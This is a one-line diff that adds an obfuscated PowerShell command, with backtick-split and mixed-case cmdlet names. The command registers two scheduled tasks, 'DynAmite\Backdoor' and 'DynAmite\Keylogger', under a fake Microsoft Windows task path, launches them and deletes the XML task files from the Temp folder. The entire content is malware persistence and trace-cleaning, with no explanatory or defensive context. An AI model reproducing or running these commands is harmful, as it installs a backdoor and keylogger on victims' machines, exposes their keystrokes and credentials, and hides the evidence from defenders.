@@ -1,0 +1,1 @@
+﻿S`chtaS`kS`.eXe /create /TN "Microsoft\Windows\DynAmite\Backdoor" /XML C:\Windows\Temp\task.xml; sCHta`S`ks.EXE /create /TN "Microsoft\Windows\DynAmite\Keylogger" /XML C:\Windows\Temp\task2.xml; sC`HTA`sks /run /TN "Microsoft\Windows\DynAmite\Backdoor"; Sch`TaSkS /run /TN "Microsoft\Windows\DynAmite\Keylogger"; RemO`V`e-iTem "C:\Windows\Temp\*.xml"
